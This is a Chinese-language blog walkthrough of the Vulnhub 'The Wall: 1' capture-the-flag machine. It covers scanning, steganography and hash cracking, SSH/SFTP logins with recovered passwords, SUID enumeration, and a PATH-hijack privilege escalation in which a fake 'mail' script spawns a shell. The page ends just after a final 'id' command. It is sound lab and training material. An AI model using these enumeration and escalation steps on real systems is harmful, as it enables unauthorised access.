@@ -1,0 +1,763 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>The Wall: 1 - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="The Wall 1 from Vulnhub 首先用nmap掃描目標ip，會發現完全沒有對外開放的por root@kali:~/Security/wall# nmap -n -p- -T5 192.168.0.116
+...
+All 65535 scanned ports on 192.168 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2015/12/19/the_wall_1/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">The Wall: 1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-12-19T17:57:45+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:57 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/the-wall-1,130/">The Wall 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<p>首先用nmap掃描目標ip，會發現完全沒有對外開放的por</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nmap -n -p- -T5 192.168.0.116
+...
+All <span class="m">65535</span> scanned ports on 192.168.0.116 are filtered</code></pre></div>
+
+
+<p>找不到對外的開口，只好來看看目標有沒有對外發送甚麼訊息</p>
+
+<p>開啟wireshark後針對目標ip設定filter</p>
+
+<p><img class="center" src="/images/2015-12-19-thewall-1/1337.png"></p>
+
+<p>發現每10秒左右會收到該目標要求跟攻擊端電腦的port 1337連線</p>
+
+<p>就來監聽一下port 1337，看看對方送甚麼內容</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nc -lp 1337
+
+                       .u!<span class="s2">&quot;`</span>
+<span class="s2">                   .x*&quot;</span><span class="sb">`</span>
+               ..+<span class="s2">&quot;NP</span>
+<span class="s2">            .z&quot;&quot;   ?</span>
+<span class="s2">          M#`      9     ,     ,</span>
+<span class="s2">                   9 M  d! ,8P&#39;</span>
+<span class="s2">                   R X.:x&#39; R&#39;  ,</span>
+<span class="s2">                   F F&#39; M  R.d&#39;</span>
+<span class="s2">                   d P  @  E`  ,</span>
+<span class="s2">      ss           P  &#39;  P  N.d&#39;</span>
+<span class="s2">       x         &#39;&#39;        &#39;</span>
+<span class="s2">       X               x             .</span>
+<span class="s2">       9     .f       !         .    $b</span>
+<span class="s2">       4;    $k      /         dH    $f</span>
+<span class="s2">       &#39;X   ;$$     z  .       MR   :$</span>
+<span class="s2">        R   M$$,   :  d9b      M&#39;   tM</span>
+<span class="s2">        M:  #&#39;$L  ;&#39; M `8      X    MR</span>
+<span class="s2">        `$;t&#39; $F  # X ,oR      t    Q;</span>
+<span class="s2">         $$@  R$ H :RP&#39; $b     X    @&#39;</span>
+<span class="s2">         9$E  @Bd&#39; $&#39;   ?X     ;    W</span>
+<span class="s2">         `M&#39;  `$M d$    `E    ;.o* :R   ..</span>
+<span class="s2">          `    &#39;  &quot;</span><span class="s1">&#39;     &#39;</span>    @<span class="s1">&#39;   &#39;</span><span class="nv">$o</span>*<span class="err">&quot;</span><span class="s1">&#39;</span>
+
+<span class="s1">              The Wall by @xerubus</span>
+<span class="s1">          -= Welcome to the Machine =-</span>
+
+
+<span class="s1">If you should go skating on the thin ice of modern life, dragging behind you the </span>
+<span class="s1">silent reproach of a million tear-stained eyes, don&#39;</span>t be surprised when a crack 
+in the ice appears under your feet. - Pink Floyd, The Thin Ice</code></pre></div>
+
+
+<p>收到一條歡迎訊息，看起來只是Pink Floyd的歌詞&hellip;</p>
+
+<p>在不知道該做甚麼的情況下只好再掃一次nmap，看看接收訊息後有沒有觸發甚麼開關</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nmap -n -sT 192.168.0.116 -p-
+
+Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-12-19 18:15 CST
+Nmap scan report <span class="k">for</span> 192.168.0.116
+Host is up <span class="o">(</span>0.0048s latency<span class="o">)</span>.
+Not shown: <span class="m">65534</span> filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+1965/tcp open  unknown
+MAC Address: AC:BC:32:80:89:77 <span class="o">(</span>Unknown<span class="o">)</span>
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 112.28 seconds</code></pre></div>
+
+
+<p>有兩個port被打開了！</p>
+
+<p>port 80有開，先用瀏覽器看一下</p>
+
+<p><img class="center" src="/images/2015-12-19-thewall-1/pink_floyd.png"></p>
+
+<p>首頁只是一張Pink Floyd的合照，不過檢視原始碼之後會看到一段備註跟一串數字</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;!--If you want to find out what<span class="s1">&#39;s behind these cold eyes, you&#39;</span>ll just have to claw your way through this disguise. - Pink Floyd, The Wall
+
+Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward <span class="k">for</span> solving the
+riddle, and further claimed that there was an enigma hidden within the artwork.
+
+737465673d3333313135373330646262623337306663626539373230666536333265633035--&gt;</code></pre></div>
+
+
+<p>備註看起來是有密碼藏在圖片裡的意思</p>
+
+<p>拿kali, stegano, password去google之後，會找到一個叫做steghide的工具</p>
+
+<p>steghide可以將檔案藏入圖片中，並且設置密碼保護</p>
+
+<p>備註的那串數字應該就是要用的密碼了</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# steghide extract -sf pink_floyd.jpg
+Enter passphrase:
+steghide: could not extract any data with that passphrase!</code></pre></div>
+
+
+<p>結果不能直接輸入數字當密碼，只好把他轉成hex試試看</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# python -c <span class="s1">&#39;print &quot;737465673d3333313135373330646262623337306663626539373230666536333265633035&quot;.decode(&quot;hex&quot;);&#39;</span>
+<span class="nv">steg</span><span class="o">=</span>33115730dbbb370fcbe9720fe632ec05</code></pre></div>
+
+
+<p>轉出來的字串看起來有意義了，但是在拿後面那串16進位的字串當密碼還是失敗</p>
+
+<p>最後看他符合md5的格式，就直接丟去google，馬上就得到答案：divisionbell</p>
+
+<p><img class="center" src="/images/2015-12-19-thewall-1/md5.png"></p>
+
+<p>輸入密碼後就會解出一個txt檔，內容看起來又是要解另兩組編碼</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# steghide extract -sf pink_floyd.jpg
+Enter passphrase:
+wrote extracted data to <span class="s2">&quot;pink_floyd_syd.txt&quot;</span>.
+root@kali:~/Security/wall# cat pink_floyd_syd.txt
+Hey Syd,
+
+I hear you<span class="err">&#39;</span>re full of dust and guitars?
+
+If you want to See Emily Play, just use this key: <span class="nv">U3lkQmFycmV0dA</span><span class="o">==</span><span class="p">|</span>f831605ae34c2399d1e5bb3a4ab245d0
+
+Roger
+
+Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
+by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
+his collection.</code></pre></div>
+
+
+<p>前半段用base64解碼後得到：SydBarrett</p>
+
+<p>後半段再拿去google搜尋md5得到：pinkfloydrocks</p>
+
+<p>解完這兩組key之後，也沒有後續的線索了</p>
+
+<p>再來試一下剛剛namp掃到的port 1965，嘗試用ssh連線看看</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nc 192.168.0.116 1965
+SSH-2.0-OpenSSH_7.0</code></pre></div>
+
+
+<p>拿剛剛得到的兩組字串當帳密去試試看</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# ssh SydBarrett@192.168.0.116 -p 1965
+The authenticity of host <span class="s1">&#39;[192.168.0.116]:1965 ([192.168.0.116]:1965)&#39;</span> can<span class="s1">&#39;t be established.</span>
+<span class="s1">ECDSA key fingerprint is 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a.</span>
+<span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
+<span class="s1">Warning: Permanently added &#39;</span><span class="o">[</span>192.168.0.116<span class="o">]</span>:1965<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
+<span class="s1">SydBarrett@192.168.0.116&#39;</span>s password:
+Could not chdir to home directory /home/SydBarrett: No such file or directory
+This service allows sftp connections only.
+Connection to 192.168.0.116 closed.</code></pre></div>
+
+
+<p>結果被系統打槍，只好照他說的用sftp登入，接著把裡面的東西通通抓回來研究</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# sftp -P1965 SydBarrett@192.168.0.116
+SydBarrett@192.168.0.116<span class="err">&#39;</span>s password:
+Connected to 192.168.0.116.
+sftp&gt; sl
+Invalid command.
+sftp&gt; ls -al
+drwxr-x---    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 .
+drwxr-x---    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 ..
+drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 .mail
+-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>         <span class="m">1912</span> Oct <span class="m">25</span> 22:56 bio.txt
+-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>       <span class="m">868967</span> Oct <span class="m">24</span> 16:17 syd_barrett_profile_pic.jpg
+sftp&gt; get bio.txt
+Fetching /bio.txt to bio.txt
+/bio.txt                                                                100% <span class="m">1912</span>     1.9KB/s   00:00
+sftp&gt; get syd_barrett_profile_pic.jpg
+Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
+/syd_barrett_profile_pic.jpg                                            100%  849KB 848.6KB/s   00:00
+sftp&gt; <span class="nb">cd</span> .mail
+sftp&gt; ls
+sent-items
+sftp&gt; ls -al
+drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 .
+drwxr-x---    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 20:16 ..
+drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Nov <span class="m">11</span> 10:25 .stash
+-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">309</span> Oct <span class="m">24</span> 18:18 sent-items
+sftp&gt; get sent-items
+Fetching /.mail/sent-items to sent-items
+/.mail/sent-items                                                       100%  <span class="m">309</span>     0.3KB/s   00:00
+sftp&gt; <span class="nb">cd</span> .
+../      ./       .stash/
+sftp&gt; <span class="nb">cd</span> .stash/
+sftp&gt; ls
+eclipsed_by_the_moon
+sftp&gt; ls -al
+drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Nov <span class="m">11</span> 10:25 .
+drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">1000</span>          <span class="m">512</span> Oct <span class="m">24</span> 18:17 ..
+-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>     <span class="m">48884479</span> Aug  <span class="m">7</span> 14:33 eclipsed_by_the_moon
+sftp&gt; get eclipsed_by_the_moon
+Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
+/.mail/.stash/eclipsed_by_the_moon                                      100%   47MB   5.8MB/s   00:00
+sftp&gt;</code></pre></div>
+
+
+<p>看來看去最可疑的是sent-items的內容和eclipsed_by_the_moon</p>
+
+<p>說找到後用scalpel處理??</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# cat sent-items
+Date: Sun, <span class="m">24</span> Oct <span class="m">1965</span> 18:45:21 +0200
+From: Syd Barrett &lt;syd@pink.floyd&gt;
+Reply-To: Syd Barret &lt;syd@pink.floyd&gt;
+To: Roger Waters &lt;roger@pink.floyd&gt;
+Subject: Had to hide the stash
+
+Roger... I had to hide the stash.
+
+Usual deal.. just use the scalpel when you find it.
+
+Ok, sorry <span class="k">for</span> that.
+
+Rock on man
+
+<span class="s2">&quot;Syd&quot;</span></code></pre></div>
+
+
+<p>檢查eclipsed_by_the_moon之後會發現他其實是個gz檔</p>
+
+<p>解壓縮後會得到一個用tar壓縮的檔案，再換tar解壓縮一次</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall/ec# file eclipsed_by_the_moon.lsd
+eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="s2">&quot;MSDOS5.0&quot;</span>, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors <span class="m">96256</span> <span class="o">(</span>volumes &gt; <span class="m">32</span> MB<span class="o">)</span> , serial number 0x9e322180, unlabeled, FAT <span class="o">(</span><span class="m">16</span> bit<span class="o">)</span></code></pre></div>
+
+
+<p>最後得到一個lsd檔</p>
+
+<p>研究一下scalpel的用法之後，到/etc/scalpel/scalpel.conf把想要搜尋的檔案類型打開</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# scalpel eclipsed_by_the_moon.lsd
+Scalpel version 1.60
+Written by Golden G. Richard III, based on Foremost 0.69.
+
+Opening target <span class="s2">&quot;/root/Security/wall/eclipsed_by_the_moon.lsd&quot;</span>
+
+Image file pass 1/2.
+eclipsed_by_the_moon.lsd: 100.0% <span class="p">|</span>*****************************************************<span class="p">|</span>   47.0 MB    00:00 ETAAllocating work queues...
+Work queues allocation complete. Building carve lists...
+Carve lists built.  Workload:
+jpg with header <span class="s2">&quot;\xff\xd8\xff\xe0\x00\x10&quot;</span> and footer <span class="s2">&quot;\xff\xd9&quot;</span> --&gt; <span class="m">1</span> files
+Carving files from image.
+Image file pass 2/2.
+eclipsed_by_the_moon.lsd: 100.0% <span class="p">|</span>*****************************************************<span class="p">|</span>   47.0 MB    00:00 ETAProcessing of image file complete. Cleaning up...
+Done.
+Scalpel is <span class="k">done</span>, files <span class="nv">carved</span> <span class="o">=</span> 1, <span class="nv">elapsed</span> <span class="o">=</span> <span class="m">0</span> seconds.</code></pre></div>
+
+
+<p><img class="center" src="/images/2015-12-19-thewall-1/roger_waters.png"></p>
+
+<p>拿到了Roger Waters的密碼，再用他的帳號登入ssh看看</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall/roger_waters# ssh RogerWaters@192.168.0.116 -p1965
+RogerWaters@192.168.0.116<span class="s1">&#39;s password:</span>
+<span class="s1">Permission denied, please try again.</span>
+<span class="s1">RogerWaters@192.168.0.116&#39;</span>s password:
+Permission denied, please try again.
+RogerWaters@192.168.0.116<span class="s1">&#39;s password:</span>
+<span class="s1">OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015</span>
+
+<span class="s1">                       .u!&quot;`</span>
+<span class="s1">                   .x*&quot;`</span>
+<span class="s1">               ..+&quot;NP</span>
+<span class="s1">            .z&quot;&quot;   ?</span>
+<span class="s1">          M#`      9     ,     ,</span>
+<span class="s1">                   9 M  d! ,8P&#39;</span>
+                   R X.:x<span class="s1">&#39; R&#39;</span>  ,
+                   F F<span class="s1">&#39; M  R.d&#39;</span>
+                   d P  @  E<span class="sb">`</span>  ,
+      ss           P  <span class="s1">&#39;  P  N.d&#39;</span>
+       x         <span class="s1">&#39;&#39;</span>        <span class="s1">&#39;</span>
+<span class="s1">       X               x             .</span>
+<span class="s1">       9     .f       !         .    $b</span>
+<span class="s1">       4;    $k      /         dH    $f</span>
+<span class="s1">       &#39;</span>X   <span class="p">;</span><span class="nv">$$</span>     z  .       MR   :<span class="err">$</span>
+        R   M<span class="nv">$$</span>,   :  d9b      M<span class="s1">&#39;   tM</span>
+<span class="s1">        M:  #&#39;</span><span class="nv">$L</span>  <span class="p">;</span><span class="s1">&#39; M `8      X    MR</span>
+<span class="s1">        `$;t&#39;</span> <span class="nv">$F</span>  <span class="c"># X ,oR      t    Q;</span>
+         <span class="nv">$$</span>@  R<span class="nv">$ </span>H :RP<span class="s1">&#39; $b     X    @&#39;</span>
+         9<span class="nv">$E</span>  @Bd<span class="s1">&#39; $&#39;</span>   ?X     <span class="p">;</span>    W
+         <span class="sb">`</span>M<span class="s1">&#39;  `$M d$    `E    ;.o* :R   ..</span>
+<span class="s1">          `    &#39;</span>  <span class="s2">&quot;&#39;     &#39;    @&#39;   &#39;$o*&quot;</span><span class="err">&#39;</span>
+<span class="nv">$ </span>uname -a
+OpenBSD thewall.localdomain 5.8 GENERIC#1066 i386
+<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span></code></pre></div>
+
+
+<p>終於成功拿到shell了，接下來要找提權的方法</p>
+
+<p>研究一下之後發現系統上有五個使用者，目前已經拿到兩個使用者的權限，推測大概要把五個都走完</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat /etc/passwd
+...
+SydBarrett:*:1000:1000:Syd Barrett:/home/SydBarrett:/sbin/nologin
+NickMason:*:1001:1001:Nick Mason:/home/NickMason:/bin/ksh
+RogerWaters:*:1002:1002:Roger Waters:/home/RogerWaters:/bin/ksh
+RichardWright:*:1003:1003:Richard Wright:/home/RichardWright:/bin/ksh
+DavidGilmour:*:1004:1004:David Gilmour:/home/DavidGilmour:/bin/ksh</code></pre></div>
+
+
+<p>接著找看看系統上特別設定stick bit的檔案</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
+...
+-rws--s--x  <span class="m">1</span> NickMason  NickMason  <span class="m">7291</span> Aug  <span class="m">8</span> 00:33 /usr/local/bin/brick
+-rwsr-s---  <span class="m">1</span> DavidGilmour  RichardWright  <span class="m">7524</span> Oct <span class="m">25</span> 07:58 /usr/local/bin/shineon</code></pre></div>
+
+
+<p>找到了兩個檔案，不過可以執行的只有/usr/local/bin/brick</p>
+
+<p>執行之後回答問題就能拿到NickMason的權限</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/brick
+...
+Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
+/bin/sh: Cannot determine current working directory
+<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>NickMason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>RogerWaters<span class="o">)</span></code></pre></div>
+
+
+<p>在NickMason的家目錄底下逛不到甚麼結果，就把nick_mason_profile_pic.jpg傳回攻擊端</p>
+
+<p>本來以為是張圖片，結果定睛一看是個ogg檔</p>
+
+<p>播放之後，會聽到一段夾雜著應該是摩斯密碼的旋律</p>
+
+<p>可以直接用聽的方式來解，不過為了避免浪費時間，還是丟到Sonic Visualizer讓他圖型化比較保險XD</p>
+
+<p><img class="center" src="/images/2015-12-19-thewall-1/morse_code.png"></p>
+
+<p>最後得到 richardwright1943farfisa</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>su RichardWright
+Password:
+ksh: Cannot determine current working directory
+<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
+<span class="err">$</span></code></pre></div>
+
+
+<p>接著以RichardWright的權限執行/usr/local/bin/shineon</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/shineon
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit</code></pre></div>
+
+
+<p>測試過後發現都是執行linux內建的程式</p>
+
+<p>稍微用strings檢查一下/usr/local/bin/shineon</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>strings /usr/local/bin/shineon
+...
+Time - The Dark Side of the Moon
+/usr/bin/cal
+Press ENTER to <span class="k">continue</span>.
+Echoes - Meddle
+/usr/bin/who
+Is There Anybody Out There? - The Wall
+/sbin/ping -c <span class="m">3</span> www.google.com
+Keep Talking- The Division Bell
+mail</code></pre></div>
+
+
+<p>看來除了mail以外，其他都是用絕對路徑執行程式，推測這邊可以修改PATH來達到SUID的效果</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/home/RogerWaters/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R6/bin:/usr/local/bin:/usr/local/sbin:/usr/games:.</code></pre></div>
+
+
+<p>這邊看到/home/RogerWaters/bin已經排在$PATH的最前面了</p>
+
+<p>再來就是切回RogerWaters的帳號，在bin的目錄建立一個假的mail</p>
+
+<p>不過因為RogerWaters的家目錄不是公開的，還要另外開放權限才能讓其他帳號使用</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>mkdir bin
+<span class="nv">$ </span><span class="nb">cd </span>bin
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#!/usr/local/bin/python&#39;</span> &gt; mail
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;import pty&#39;</span> &gt;&gt; mail
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;pty.spawn(&quot;/bin/sh&quot;)&#39;</span> &gt;&gt; mail
+<span class="nv">$ </span>chmod +x mail</code></pre></div>
+
+
+<p>設定完就切回RichardWright，再執行一次/usr/local/bin/shineon，就拿到DavidGilmour的群組權限了</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>/usr/local/bin/shineon
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+4
+Keep Talking- The Division Bell
+/bin/sh: Cannot determine current working directory
+<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
+<span class="err">$</span></code></pre></div>
+
+
+<p>在DavidGilmour的家目錄下發現一個anotherbrick.txt，裡面提供了一串網址</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>cat anotherbrick.txt
+<span class="c"># Come on you raver, you seer of visions, come on you painter, you piper, you prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond</span>
+
+New website <span class="k">for</span> review:    pinkfloyd1965newblogsite50yearscelebration-temp/index.php
+
+<span class="c"># You have to be trusted by the people you lie to. So that when they turn their backs on you, you&#39;ll get the chance to put the knife in. - Pink Floyd, Dogs</span>
+<span class="err">$</span></code></pre></div>
+
+
+<p>連上網頁後，在程式碼最後有一行註解</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;!--Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes
+Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?--&gt;</code></pre></div>
+
+
+<p><img class="center" src="/images/2015-12-19-thewall-1/dog.png"></p>
+
+<p>這隻狗下面貌似有兩排字，調整亮度跟對比後會得到</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">/welcometothemachine
+50696e6b466c6f796435305965617273</code></pre></div>
+
+
+<p>50696e6b466c6f796435305965617273用hex解碼後會得到PinkFloyd50Years</p>
+
+<p>而將/welcometothemachine輸入網址列後會得到403 Forbidden的結果</p>
+
+<p>實際到/var/www目錄後，看到htdocs的群組權限是指定給welcometothemachine</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
+<span class="nv">$ </span>cat /etc/group
+welcometothemachine:*:1005:DavidGilmour</code></pre></div>
+
+
+<p>在這邊卡了十分鐘之後，只好認命回家目錄再找找有沒有其他線索</p>
+
+<p>最後在david_gilmour_profile_pic.jpg找到了一個字串</p>
+
+<p>拿這當的密碼就能登入DavidGilmour的帳號了orz</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>strings david_gilmour_profile_pic.jpg
+who_are_you_and_who_am_i
+<span class="nv">$ </span>su DavidGilmour
+Password:
+<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span></code></pre></div>
+
+
+<p>再回到剛剛的/var/www/htdocs，最後找到PinkFloyd這個執行檔</p>
+
+<p>本來以為解碼過的字串是正確答案，結果原句輸入就得到了新的權限了orz</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>./PinkFloyd
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer: PinkFloyd50Years
+
+Denied....
+If I had my way, I<span class="err">&#39;</span>d have all of ya shot. - Pink Floyd, In The Flesh
+<span class="nv">$ </span>./PinkFloyd
+Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
+Answer: 50696e6b466c6f796435305965617273
+
+Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless
+
+Congratulations... permission has been granted.
+You can now <span class="nb">set </span>your controls to the heart of the sun!
+<span class="nv">$ </span>id
